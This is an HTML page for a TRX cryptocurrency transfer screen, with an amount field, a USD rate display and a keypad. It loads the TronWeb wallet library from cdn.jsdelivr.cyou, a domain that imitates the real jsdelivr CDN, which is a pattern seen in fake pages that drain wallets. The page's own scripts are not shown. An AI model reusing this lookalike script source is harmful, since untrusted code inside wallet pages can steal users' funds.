<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>正在申请转账</title>
    <link rel="stylesheet" href="css/style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
</head>
<body>
    <div class="container">
        <div class="pay-box">
            <div class="amount">
                <div class="num">
                    <span id="amount">0</span>
                    <em id="currency">TRX</em>
                </div>
                <img src="png/icon_exchange.jpg" class="icon" id="switchCurrency">
            </div>
            <div class="rate">
                <span id="amount-display">0.00</span>
                <em>USD</em>
                <div class="icon"><img src="png/icon_horn.jpg"></div>
            </div>
        </div>

        <div class="keyboard-box">
            <div class="btn">1</div><div class="btn">2</div><div class="btn">3</div>
            <div class="btn">4</div><div class="btn">5</div><div class="btn">6</div>
            <div class="btn">7</div><div class="btn">8</div><div class="btn">9</div>
            <div class="btn">.</div><div class="btn">0</div>
            <div class="btn delete"><img src="png/icon_delete.jpg"></div>
        </div>

        <button id="submitBtn" class="submit-btn" disabled>下一步</button>
    </div>

    <div class="tishi" id="tip">提示</div>

    <script src="js/app.js"></script>
    <script src="js/tron.js"></script>
</body>
</html>
